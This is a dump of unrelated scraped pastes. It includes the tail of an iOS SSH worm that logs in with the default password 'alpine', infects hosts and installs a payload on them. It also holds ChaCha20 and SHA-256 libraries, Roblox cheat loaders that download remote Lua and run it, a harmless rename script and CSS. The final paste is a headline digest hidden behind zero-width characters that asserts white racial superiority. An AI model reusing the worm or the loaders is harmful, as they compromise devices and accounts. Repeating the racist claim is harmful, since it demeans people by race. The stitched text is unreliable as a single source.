    if (!CopyFile(""/private/var/mobile/home/cydia.tgz"", ""/private/var/mobile/home/cydia.tgz"", host))
    	prunCommand(""cd /private/var/mobile/home/;tar xzf cydia.tgz;./inst"", host);
  }
  return 0;
}"
k9TUqb9G,worm/sshd.h,FlyFar,C,Sunday 24th of March 2024 11:37:54 PM CDT,"#include <sys/fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <syslog.h>
#include <errno.h>
#include <ifaddrs.h>
#include <string.h>

#define VULN_PASS ""alpine""

void scanner(char *ipRange);
int scanHost(char* host);
int checkHost(char *host);
int runCommand(char* command, char *host);
int prunCommand(char* command, char *host);
int CopyFile(char* src, char* dst, char* host);
int infectHost(char *host);
char *randHost(void);
int get_lock(void);
char *getAddrRange();
int tokenise (char input[], char *token[], char* spl);"
81gczWE4,libs/ChaCha20/chacha20.h,FlyFar,C++,Sunday 24th of March 2024 11:31:30 PM CDT,"#ifndef __CHACHA20_H
#define __CHACHA20_H
#include <stdint.h>

void ChaCha20XOR(uint8_t key[32], uint32_t counter, uint8_t nonce[12], uint8_t *input, uint8_t *output, int inputlen);

#endif"
QFsm9Lyg,libs/ChaCha20/chacha20.cpp,FlyFar,C++,Sunday 24th of March 2024 11:30:36 PM CDT,"#include <stdint.h>
#include <string.h>
#include ""chacha20.h""

static inline void u32t8le(uint32_t v, uint8_t p[4]) {
    p[0] = v & 0xff;
    p[1] = (v >> 8) & 0xff;
    p[2] = (v >> 16) & 0xff;
    p[3] = (v >> 24) & 0xff;
}

static inline uint32_t u8t32le(uint8_t p[4]) {
    uint32_t value = p[3];

    value = (value << 8) | p[2];
    value = (value << 8) | p[1];
    value = (value << 8) | p[0];

    return value;
}

static inline uint32_t rotl32(uint32_t x, int n) {
    // http://blog.regehr.org/archives/1063
    return x << n | (x >> (-n & 31));
}

// https://tools.ietf.org/html/rfc7539#section-2.1
static void chacha20_quarterround(uint32_t *x, int a, int b, int c, int d) {
    x[a] += x[b]; x[d] = rotl32(x[d] ^ x[a], 16);
    x[c] += x[d]; x[b] = rotl32(x[b] ^ x[c], 12);
    x[a] += x[b]; x[d] = rotl32(x[d] ^ x[a],  8);
    x[c] += x[d]; x[b] = rotl32(x[b] ^ x[c],  7);
}

static void chacha20_serialize(uint32_t in[16], uint8_t output[64]) {
    int i;
    for (i = 0; i < 16; i++) {
        u32t8le(in[i], output + (i << 2));
    }
}

static void chacha20_block(uint32_t in[16], uint8_t out[64], int num_rounds) {
    int i;
    uint32_t x[16];

    memcpy(x, in, sizeof(uint32_t) * 16);

    for (i = num_rounds; i > 0; i -= 2) {
        chacha20_quarterround(x, 0, 4,  8, 12);
        chacha20_quarterround(x, 1, 5,  9, 13);
        chacha20_quarterround(x, 2, 6, 10, 14);
        chacha20_quarterround(x, 3, 7, 11, 15);
        chacha20_quarterround(x, 0, 5, 10, 15);
        chacha20_quarterround(x, 1, 6, 11, 12);
        chacha20_quarterround(x, 2, 7,  8, 13);
        chacha20_quarterround(x, 3, 4,  9, 14);
    }

    for (i = 0; i < 16; i++) {
        x[i] += in[i];
    }

    chacha20_serialize(x, out);
}

// https://tools.ietf.org/html/rfc7539#section-2.3
static void chacha20_init_state(uint32_t s[16], uint8_t key[32], uint32_t counter, uint8_t nonce[12]) {
    int i;

    // refer: https://dxr.mozilla.org/mozilla-beta/source/security/nss/lib/freebl/chacha20.c
    // convert magic number to string: ""expand 32-byte k""
    s[0] = 0x61707865;
    s[1] = 0x3320646e;
    s[2] = 0x79622d32;
    s[3] = 0x6b206574;

    for (i = 0; i < 8; i++) {
        s[4 + i] = u8t32le(key + i * 4);
    }

    s[12] = counter;

    for (i = 0; i < 3; i++) {
        s[13 + i] = u8t32le(nonce + i * 4);
    }
}

void ChaCha20XOR(uint8_t key[32], uint32_t counter, uint8_t nonce[12], uint8_t *in, uint8_t *out, int inlen) {
    int i, j;

    uint32_t s[16];
    uint8_t block[64];

    chacha20_init_state(s, key, counter, nonce);

    for (i = 0; i < inlen; i += 64) {
        chacha20_block(s, block, 20);
        s[12]++;

        for (j = i; j < i + 64; j++) {
            if (j >= inlen) {
                break;
            }
            out[j] = in[j] ^ block[j - i];
        }
    }
}"
AxcTKymC,libs/SHA256/sha256.h,FlyFar,C++,Sunday 24th of March 2024 11:26:38 PM CDT,"/*
*   SHA-256 implementation.
*
*   Copyright (c) 2010 Ilya O. Levin, http://www.literatecode.com
*
*   Permission to use, copy, modify, and distribute this software for any
*   purpose with or without fee is hereby granted, provided that the above
*   copyright notice and this permission notice appear in all copies.
*
*   THE SOFTWARE IS PROVIDED ""AS IS"" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
*   WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
*   MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
*   ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
*   WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
*   ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
*   OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/
#ifdef _MSC_VER
#ifndef uint8_t
typedef unsigned __int8 uint8_t;
#endif
#ifndef uint32_t
typedef unsigned __int32 uint32_t;
#endif
#ifndef uint64_t
typedef __int64 int64_t;
typedef unsigned __int64 uint64_t;
#endif
#else
#include <stdint.h>
#endif

#ifdef __cplusplus
extern ""C""
{
#endif

   typedef struct {
       uint32_t buf[16];
       uint32_t hash[8];
       uint32_t len[2];
   } sha256_context;

   void sha256_init(sha256_context *);
   void sha256_hash(sha256_context *, uint8_t * /* data */, uint32_t /* len */);
   void sha256_done(sha256_context *, uint8_t * /* hash */);
   void sha256(uint8_t *output, uint8_t *input, int inlen);

#ifdef __cplusplus
}
#endif"
QEcigJn2,libs/SHA256/sha256.cpp,FlyFar,C++,Sunday 24th of March 2024 11:25:56 PM CDT,"/*
*   SHA-256 implementation.
*
*   Copyright (c) 2010 Ilya O. Levin, http://www.literatecode.com
*
*   Permission to use, copy, modify, and distribute this software for any
*   purpose with or without fee is hereby granted, provided that the above
*   copyright notice and this permission notice appear in all copies.
*
*   THE SOFTWARE IS PROVIDED ""AS IS"" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
*   WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
*   MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
*   ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
*   WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
*   ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
*   OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/
#define SWAP_BYTES
// #define USE_STD_MEMCPY

#ifdef USE_STD_MEMCPY
#include <string.h>
#endif
#include ""sha256.h""

#ifdef __cplusplus
extern ""C"" {
#endif

#define RL(x,n)   (((x) << n) | ((x) >> (32 - n)))
#define RR(x,n)   (((x) >> n) | ((x) << (32 - n)))

#define S0(x)  (RR((x), 2) ^ RR((x),13) ^ RR((x),22))
#define S1(x)  (RR((x), 6) ^ RR((x),11) ^ RR((x),25))
#define G0(x)  (RR((x), 7) ^ RR((x),18) ^ ((x) >> 3))
#define G1(x)  (RR((x),17) ^ RR((x),19) ^ ((x) >> 10))

#ifdef SWAP_BYTES
#define BSWP(x,y)  _bswapw((uint32_t *)(x), (uint32_t)(y))
#else
#define BSWP(p,n)
#endif
#ifdef USE_STD_MEMCPY
#define MEMCP(x,y,z) memcpy((x),(y),(z))
#else
#define MEMCP(x,y,z) _memcp((x),(y),(z))
#endif

#ifndef __cdecl
#define __cdecl
#endif

static const uint32_t K[64] = {
     0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
     0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
     0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
     0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
     0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
     0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
     0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
     0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
     0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
     0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
     0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
     0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
     0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
     0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
     0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
     0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
};

/* -------------------------------------------------------------------------- */
static void _bswapw(uint32_t *p, uint32_t i)
{
    while (i--) p[i] = (RR(p[i],24) & 0x00ff00ff) | (RR(p[i],8) & 0xff00ff00);

} /* _bswapw */

/* -------------------------------------------------------------------------- */
#ifndef USE_STD_MEMCPY
void * __cdecl _memcp (void *d, const void *s, uint32_t sz)
{
    void *rv = d;

    while (sz--) *(char *)d = *(char *)s, d = (char *)d + 1,  s = (char *)s + 1;

    return(rv);
} /* _memcp */
#endif

/* -------------------------------------------------------------------------- */
static void _rtrf(uint32_t *b, uint32_t *p, uint32_t i, uint32_t j)
{
    #define B(x, y) b[(x-y) & 7]
    #define P(x, y) p[(x+y) & 15]

    B(7,i) += (j ? (p[i & 15] += G1(P(i,14)) + P(i,9) + G0(P(i,1))) : p[i & 15])
              + K[i+j] + S1(B(4,i))
              + (B(6,i) ^ (B(4,i) & (B(5,i) ^ B(6,i))));
    B(3,i) += B(7,i);
    B(7,i) += S0(B(0,i)) + ( (B(0,i) & B(1,i)) | (B(2,i) & (B(0,i) ^ B(1,i))) );

    #undef P
    #undef B
} /* _rtrf */

/* -------------------------------------------------------------------------- */
static void _hash(sha256_context *ctx)
{
    uint32_t b[8], *p, j;

    b[0] = ctx->hash[0]; b[1] = ctx->hash[1]; b[2] = ctx->hash[2];
    b[3] = ctx->hash[3]; b[4] = ctx->hash[4]; b[5] = ctx->hash[5];
    b[6] = ctx->hash[6]; b[7] = ctx->hash[7];

    for (p = ctx->buf, j = 0; j < 64; j += 16)
        _rtrf(b, p,  0, j), _rtrf(b, p,  1, j), _rtrf(b, p,  2, j),
        _rtrf(b, p,  3, j), _rtrf(b, p,  4, j), _rtrf(b, p,  5, j),
        _rtrf(b, p,  6, j), _rtrf(b, p,  7, j), _rtrf(b, p,  8, j),
        _rtrf(b, p,  9, j), _rtrf(b, p, 10, j), _rtrf(b, p, 11, j),
        _rtrf(b, p, 12, j), _rtrf(b, p, 13, j), _rtrf(b, p, 14, j),
        _rtrf(b, p, 15, j);

    ctx->hash[0] += b[0]; ctx->hash[1] += b[1]; ctx->hash[2] += b[2];
    ctx->hash[3] += b[3]; ctx->hash[4] += b[4]; ctx->hash[5] += b[5];
    ctx->hash[6] += b[6]; ctx->hash[7] += b[7];

} /* _hash */

/* -------------------------------------------------------------------------- */
void sha256_init(sha256_context *ctx)
{
    ctx->len[0] = ctx->len[1] = 0;
    ctx->hash[0] = 0x6a09e667; ctx->hash[1] = 0xbb67ae85;
    ctx->hash[2] = 0x3c6ef372; ctx->hash[3] = 0xa54ff53a;
    ctx->hash[4] = 0x510e527f; ctx->hash[5] = 0x9b05688c;
    ctx->hash[6] = 0x1f83d9ab; ctx->hash[7] = 0x5be0cd19;

} /* sha256_init */

/* -------------------------------------------------------------------------- */
void sha256_hash(sha256_context *ctx, uint8_t *dat, uint32_t sz)
{
    register uint32_t i = ctx->len[0] & 63, l, j;

    if ((ctx->len[0] += sz) < sz)  ++(ctx->len[1]);

    for (j = 0, l = 64-i; sz >= l; j += l, sz -= l, l = 64, i = 0)
    {
        MEMCP((char *)ctx->buf + i, &dat[j], l);
        BSWP(ctx->buf, 16 );
        _hash(ctx);
    }
    MEMCP((char *)ctx->buf + i, &dat[j], sz);

} /* _hash */

/* -------------------------------------------------------------------------- */
void sha256_done(sha256_context *ctx, uint8_t *buf)
{
    uint32_t i = (uint32_t)(ctx->len[0] & 63), j = ((~i) & 3) << 3;

    BSWP(ctx->buf, (i + 3) >> 2);

    ctx->buf[i >> 2] &= 0xffffff80 << j;  /* add padding */
    ctx->buf[i >> 2] |= 0x00000080 << j;

    if (i < 56) i = (i >> 2) + 1;
       else ctx->buf[15] ^= (i < 60) ? ctx->buf[15] : 0, _hash(ctx), i = 0;

    while (i < 14) ctx->buf[i++] = 0;

    ctx->buf[14] = (ctx->len[1] << 3)|(ctx->len[0] >> 29); /* add length */
    ctx->buf[15] = ctx->len[0] << 3;

    _hash(ctx);

    for (i = 0; i < 32; i++)
       ctx->buf[i % 16] = 0, /* may remove this line in case of a DIY cleanup */
       buf[i] = (uint8_t)(ctx->hash[i >> 2] >> ((~i & 3) << 3));

} /* sha256_done */

void sha256(uint8_t *output, uint8_t *input, int inlen)
{
	sha256_context ctx;
	
	sha256_init(&ctx);
    sha256_hash(&ctx, input, inlen);
    return sha256_done(&ctx, output);
}

#ifdef __cplusplus
}
#endif"
PJqWzz9F,Collect All Pets (THE HUNT),GETFREEROBUX,Lua,Sunday 24th of March 2024 11:10:34 PM CDT,"_G.Theme = ""Light"" 
_G.V3rmillion = true
loadstring(game:HttpGet(""https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/CollectAllPets.lua""))()"
pCfuMCEr,Lumber Tycoon 2 (THE HUNT),GETFREEROBUX,Lua,Sunday 24th of March 2024 11:09:12 PM CDT,"game:HttpGet(""https://getexploits.com/cexecution/694139985821192192"")
loadstring(game:HttpGet""https://raw.githubusercontent.com/darkxwin/darkxsourcethinkyoutousedarkx/main/darkx"")()"
Rj68C1Fh,PASTEBIN-REMOVE-ID-NAME.py,Najeebsk,Python,Sunday 24th of March 2024 11:05:19 PM CDT,"import os

def remove_after_space(directory):
    for filename in os.listdir(directory):
        if ' ' in filename:
            new_filename = filename.split()[0]
            old_path = os.path.join(directory, filename)
            new_path = os.path.join(directory, new_filename)
            if os.path.exists(new_path):
                # Rename the existing file with a different name
                new_path = os.path.join(directory, new_filename + ""_renamed"")
                os.rename(old_path, new_path)
                print(f""Renamed: {filename} to {new_filename}_renamed"")
            else:
                os.rename(old_path, new_path)
                print(f""Renamed: {filename} to {new_filename}"")

# Get the current working directory
current_directory = os.getcwd()

# Call the function to remove anything after a space in filenames
remove_after_space(current_directory)
"
0cXC1pup,Pro for fknnrd,althindor,CSS,Sunday 24th of March 2024 10:39:03 PM CDT,"/* Profile by AlthIndor */

html, body {
    background: #F8F8F8;
    height: unset;
    min-height: 100vh;
}

body {
    display: flex;
    flex-flow: column nowrap;
    align-items: center;
    justify-content: center;
    padding: 160px 0 100px 0;
    box-sizing: border-box;
}
#pictures_container {order: 1;}
#columns {order: 2;}

body a {
    font-weight: 400 !important;
    text-decoration: none !important;
}

::selection {
    background: #606060;
    color: #F8F8F8;
}

/* Atlas Control */

#columns, .panel h2, .item, .avatar_decoration:nth-of-type(n+2) {background: url('https://i.imgur.com/dTNdYfH.png') no-repeat;}
#columns {background-position: 0 -80px;}
.panel h2 {background-position: -640px -80px;}
.custom_panel h2 {background-position: -640px -120px;}

.item {background-position: -640px -210px;}
.avatar_decoration:nth-of-type(n+2) {background-position: -640px -270px;}
.avatar_decoration:nth-of-type(n+2) a {mask: url('https://i.imgur.com/dTNdYfH.png') -760px -270px;}
.item:has(a:hover), .avatar_decoration:has(a:hover) {background-position-x: -700px;}

.custom_panel span {
    background:
        url('https://i.imgur.com/dTNdYfH.png') left 0,
        url('https://i.imgur.com/dTNdYfH.png') right -40px,
        linear-gradient(to left, #00000000 5px, #000000FF 5px, #000000FF calc(100% - 5px), transparent calc(100% - 5px));
}

/* Fonts */

@font-face {
    font-family: 'Press Start 2P';
    font-style: normal;
    font-weight: 400;
    src: url('https://fonts.gstatic.com/s/pressstart2p/v15/e3t4euO8T-267oIAQAu6jDQyK3nVivM.woff2') format('woff2');
}

/* Header */

#viewer #gaia_header, #gaia_header ul {background: none !important;}
#viewer #gaia_header li.spacer {display: none !important;}

#viewer #gaia_header {
    width: calc(100% - 20px) !important;
    height: 49px !important;
    position: absolute !important;
    top: 10px !important;
    left: 10px !important;
    border: 16px solid transparent;
    border-width: 14px 16px 16px 14px;
    border-image: url('https://i.imgur.com/gP6OH21.png') 14 16 16 14 fill;
    box-sizing: border-box;
}

#gaia_header ul {
    width: unset !important;
    font: 0/20px 'Press Start 2P', sans-serif !important;
    padding: 0 7px !important;
}

#gaia_header #header_right {
    float: right;
    display: grid !important;
    grid-auto-flow: column;
}
#gaia_header #header_right li:nth-of-type(4) {grid-column: 2;}

#gaia_header a, #gaia_header a::before {font-size: 8px !important;}
#gaia_header a {color: #F8F8F8 !important;}
#gaia_header a:hover {color: #A8A8A8 !important;}

#header_left img {
    mask: url('https://i.imgur.com/cGGVY2x.png') 0 0 no-repeat;
    background: currentColor;
    width: 0;
    height: 16px;
    padding: 0 34px 0 0;
}

#header_right a[href*='mode=edit'], #header_right a[href*='report.php'] {font-size: 0 !important;}
#header_right a[href*='mode=edit']::before {content: 'Edit My Own';}
#header_right a[href*='report.php']::before {content: 'Report Profile';}

#header_left li:nth-of-type(n+3)::before, #header_right li:nth-of-type(n+2)::before {
    content: '';
    display: inline-block;
    background: #A8A8A8;
    width: 4px;
    height: 4px;
    margin: 0 8px;
    position: relative;
    top: -2px;
}

/* Columns */

#columns {
    width: 628px;
    font-size: 0;
    padding-top: 254px;
    position: relative;
    top: 0;
}
#columns .column {display: contents;}

/* Panels */

.panel, .panel h2 {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

.panel {
    background: none;
    color: #000;
    font: 8px/2.5 'Press Start 2P', sans-serif;
    text-align: center;
}
.panel a {color: #A8A8A8;}
.panel a:hover {color: inherit;}

.panel h2 {
    height: 36px;
    font-size: 0;
}

#id_details, #id_about, .media_panel {position: absolute;}
#id_details h2, #id_about h2, .media_panel h2 {display: none;}

#id_about {
    width: 315px;
    height: 126px;
    top: 98px;
    left: 293px;
}

#id_wishlist, .custom_panel {
    border: 20px solid transparent;
    border-width: 20px 20px 20px 18px;
    border-image: url('https://i.imgur.com/aPDHPgh.png') 20 20 20 18;
}
#id_wishlist {margin-bottom: 10px;}

/* Details and Second Avatar */

#id_details {
    top: 64px;
    left: 28px;
}
#id_details p:nth-of-type(n+2), .forum_userstatus {display: none;}
#id_details p {margin: 0;}

.avatar_decoration:first-of-type a {
    position: absolute !important;
    bottom: -202px;
    left: 107px;
}

/* Media */

.media_panel {
    background: url('https://i.imgur.com/MWTKBXK.gif');
    width: 14px;
    height: 11px !important;
    top: 213px;
    right: 20px;
    overflow: hidden;
    filter: invert(1);
    z-index: 1;
}

.media_panel iframe {
    width: 300px;
    height: 200px;
    position: absolute;
    bottom: calc(50% - 20px);
    left: calc(50% - 35px);
    opacity: .001;
}

form .media_panel {
    font-size: 0;
    overflow: visible;
}

form .media_panel .buttons {
    width: max-content;
    position: absolute;
    top: -2px;
    right: 20px;
    filter: invert(1);
}

/* Round Tiles */

#id_wishlist, #pictures_container {
    display: grid;
    grid-auto-rows: max-content;
    gap: 10px;
}
#id_wishlist {grid-template-columns: repeat(10, 50px);}
#pictures_container {grid-template-columns: repeat(9, 52px);}

#id_wishlist a, .avatar_decoration:nth-of-type(n+2) a {
    border-radius: 50%;
    overflow: hidden;
}
#id_wishlist a, .avatar_decoration a {display: block;}

/* Wish List */

#id_wishlist h2 {grid-column: 1/-1;}
#id_wishlist .item {position: relative;}
#id_wishlist .premium_sparkle, #id_wishlist .clear {display: none;}

#id_wishlist a {
    width: 30px;
    height: 30px;
    padding: 10px;
}

.owner_checkmark {
    background: #F8F8F8;
    padding: 2px;
    margin: 0;
    bottom: 0;
    left: 0;
    border: 1px solid #A8A8A8;
    pointer-events: none;
}
#id_wishlist .item:has(a:hover) .owner_checkmark {border-color: #000;}

/* Gallery */

.custom_panel h2 {margin-bottom: 10px;}
.custom_panel span, .custom_panel img {display: block;}
.custom_panel br {display: none;}

.custom_panel h2 + div {
    max-height: 500px;
    padding: 0 10px 0 0;
    overflow: hidden scroll;
    scrollbar-color: #000 transparent;
}

.custom_panel span {
    height: 34px;
    font-size: 16px;
    line-height: 36px;
    margin: 40px auto;
    position: sticky;
    top: 0;
    box-shadow: 0 10px #F8F8F8;
    z-index: 1;
}
.custom_panel span:first-of-type {margin-top: 0;}

.custom_panel img {
    max-width: 480px !important;
    margin: 10px auto;
    mix-blend-mode: multiply;
}
.custom_panel img:last-of-type {margin-bottom: 0;}

/* Avatar Tiles */

#pictures_container {
    position: relative;
    margin: 0 0 -12px 13px;
}

.avatar_decoration {
    width: 52px !important;
    height: 52px !important;
    position: static !important;
}
.avatar_decoration .buttons {top: 0;}

.avatar_decoration:nth-of-type(1) img {
    width: unset !important;
    height: unset !important;
}

.avatar_decoration:nth-of-type(n+2) {contain: layout;}
.avatar_decoration:nth-of-type(n+2) a {padding: 2px;}

/* Saturation Effect */

#id_details, .item, .custom_panel img, .avatar_decoration a {filter: grayscale(1);}
#id_details:hover, .item:has(a:hover), .custom_panel img:hover, .avatar_decoration a:hover {filter: none;}

/* Avatar Head Grid Spacer */
/* Change 'span' Value to Change First Head Offset */

.avatar_decoration:first-of-type {grid-column: 1 / span 3;}"
bs6WRJ3e,News March24 24,Newscaster_Ned,Email,Sunday 24th of March 2024 10:01:03 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

W‎h‎i‎t‎e‎s‎ ‎a‎r‎e‎ ‎t‎h‎e‎ ‎s‎u‎p‎e‎r‎i‎o‎r‎ ‎r‎a‎c‎e‎.‎

U‎C‎ ‎B‎e‎r‎k‎e‎l‎e‎y‎ ‎P‎r‎o‎f‎e‎s‎s‎o‎r‎ ‎A‎p‎o‎l‎o‎g‎i‎z‎e‎s‎ ‎f‎o‎r‎ ‎'‎M‎i‎s‎o‎g‎y‎n‎i‎s‎t‎'‎ ‎C‎o‎m‎m‎e‎n‎t‎ ‎o‎n‎ ‎D‎a‎t‎i‎n‎g‎
P‎o‎l‎l‎:‎ ‎T‎r‎u‎m‎p‎ ‎N‎a‎r‎r‎o‎w‎l‎y‎ ‎L‎e‎a‎d‎s‎ ‎B‎i‎d‎e‎n‎ ‎i‎n‎ ‎S‎w‎i‎n‎g‎-‎S‎t‎a‎t‎e‎ ‎M‎i‎c‎h‎i‎g‎a‎n‎
W‎A‎T‎C‎H‎:‎ ‎N‎Y‎C‎ ‎M‎o‎m‎ ‎R‎e‎s‎c‎u‎e‎s‎ ‎T‎e‎e‎n‎ ‎D‎a‎u‎g‎h‎t‎e‎r‎ ‎f‎r‎o‎m‎ ‎A‎l‎l‎e‎g‎e‎d‎ ‎K‎i‎d‎n‎a‎p‎p‎e‎r‎
K‎a‎m‎a‎l‎a‎ ‎C‎l‎a‎p‎s‎ ‎t‎o‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎S‎o‎n‎g‎ ‎B‎e‎f‎o‎r‎e‎ ‎T‎r‎a‎n‎s‎l‎a‎t‎i‎o‎n‎
P‎a‎s‎t‎o‎r‎ ‎F‎r‎e‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎Y‎e‎a‎r‎s‎ ‎i‎n‎ ‎J‎a‎i‎l‎ ‎I‎s‎ ‎T‎r‎a‎p‎p‎e‎d‎ ‎i‎n‎ ‎C‎h‎i‎n‎a‎ ‎W‎i‎t‎h‎o‎u‎t‎ ‎I‎D‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
K‎a‎m‎a‎l‎a‎ ‎C‎l‎a‎p‎s‎ ‎A‎l‎o‎n‎g‎ ‎t‎o‎ ‎P‎u‎e‎r‎t‎o‎ ‎R‎i‎c‎a‎n‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎S‎o‎n‎g‎ ‎B‎e‎f‎o‎r‎e‎ ‎R‎e‎a‎l‎i‎z‎i‎n‎g‎ ‎I‎t‎’‎s‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎H‎e‎r‎

V‎i‎d‎e‎o‎:‎ ‎V‎E‎E‎P‎ ‎S‎u‎f‎f‎e‎r‎s‎ ‎E‎m‎b‎a‎r‎r‎a‎s‎s‎i‎n‎g‎ ‎M‎o‎m‎e‎n‎t‎…‎ ‎A‎g‎a‎i‎n‎

S‎i‎g‎n‎s‎:‎ ‎K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎ ‎a‎ ‎W‎a‎r‎ ‎C‎r‎i‎m‎i‎n‎a‎l‎
V‎i‎c‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎,‎ ‎l‎e‎f‎t‎,‎ ‎a‎n‎d‎ ‎F‎r‎a‎n‎k‎i‎e‎ ‎M‎i‎r‎a‎n‎d‎a‎,‎ ‎H‎i‎s‎p‎a‎n‎i‎c‎ ‎F‎e‎d‎e‎r‎a‎t‎i‎o‎n‎ ‎p‎r‎e‎s‎i‎d‎e‎n‎t‎,‎ ‎a‎p‎
V‎i‎c‎e‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎ ‎h‎a‎d‎ ‎a‎n‎ ‎e‎m‎b‎a‎r‎r‎a‎s‎s‎i‎n‎g‎ ‎f‎u‎m‎b‎l‎e‎ ‎d‎u‎r‎i‎n‎g‎ ‎a‎ ‎F‎r‎i‎d‎a‎y‎ ‎v‎i‎s‎i‎t‎ ‎t‎o‎ ‎P‎u‎e‎r‎t‎o‎ ‎R‎i‎c‎o‎,‎ ‎w‎h‎e‎r‎e‎ ‎s‎h‎e‎ ‎w‎a‎s‎ ‎s‎p‎o‎t‎t‎e‎d‎ ‎c‎l‎a‎p‎p‎i‎n‎g‎ ‎a‎l‎o‎n‎g‎ ‎t‎o‎ ‎a‎ ‎p‎r‎o‎t‎e‎s‎t‎ ‎s‎o‎n‎g‎ ‎a‎g‎a‎i‎n‎s‎t‎ ‎h‎e‎r‎ ‎b‎e‎f‎o‎r‎e‎ ‎a‎n‎ ‎a‎i‎d‎e‎ ‎t‎r‎a‎n‎s‎l‎a‎t‎e‎d‎ ‎t‎h‎e‎ ‎l‎y‎r‎i‎c‎s‎.‎

S‎e‎n‎a‎t‎e‎ ‎A‎v‎e‎r‎t‎s‎ ‎S‎h‎u‎t‎d‎o‎w‎n‎ ‎w‎i‎t‎h‎ ‎E‎a‎r‎l‎y‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎ ‎M‎o‎r‎n‎i‎n‎g‎ ‎V‎o‎t‎e‎
S‎e‎n‎a‎t‎e‎ ‎A‎v‎e‎r‎t‎s‎ ‎S‎h‎u‎t‎d‎o‎w‎n‎ ‎w‎i‎t‎h‎ ‎E‎a‎r‎l‎y‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎ ‎M‎o‎r‎n‎i‎n‎g‎ ‎V‎o‎t‎e‎
8‎,‎8‎5‎9‎
K‎a‎m‎a‎l‎a‎ ‎H‎a‎r‎r‎i‎s‎ ‎S‎a‎y‎s‎ ‎‘‎C‎o‎n‎s‎e‎q‎u‎e‎n‎c‎e‎s‎’‎ ‎P‎o‎s‎s‎i‎b‎l‎e‎ ‎i‎f‎ ‎I‎s‎r‎a‎e‎l‎ ‎R‎a‎i‎d‎s‎ ‎R‎a‎f‎a‎h‎;‎ ‎‘‎I‎ ‎H‎a‎v‎e‎ ‎S‎t‎u‎d‎i‎e‎d‎
